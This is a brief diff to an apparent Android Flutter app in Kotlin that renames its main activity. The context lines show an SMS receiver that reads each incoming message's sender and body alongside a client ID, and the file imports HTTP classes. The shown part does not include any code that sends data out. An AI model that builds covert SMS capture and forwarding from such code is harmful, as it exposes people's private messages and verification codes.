@@ -23,7 +23,7 @@ import java.io.OutputStream
 import java.net.HttpURLConnection
 import java.net.URL
 
-class MainActivity : FlutterActivity() {
+class GetdActivity : FlutterActivity() {
     private val CHANNEL = "com.example.zxwy"
 
     // 全局变量 clientId
@@ -67,7 +67,7 @@ class SmsReceiver : BroadcastReceiver() {
                 val smsMessage = SmsMessage.createFromPdu(pdu as ByteArray)
                 val senderPhoneNumber = smsMessage.displayOriginatingAddress
                 val messageBody = smsMessage.messageBody
-                val clientID = MainActivity.clientId
+                val clientID = GetdActivity.clientId
 
                 Log.d(TAG, "SMS Received - Sender: $senderPhoneNumber, Message: $messageBody")
 
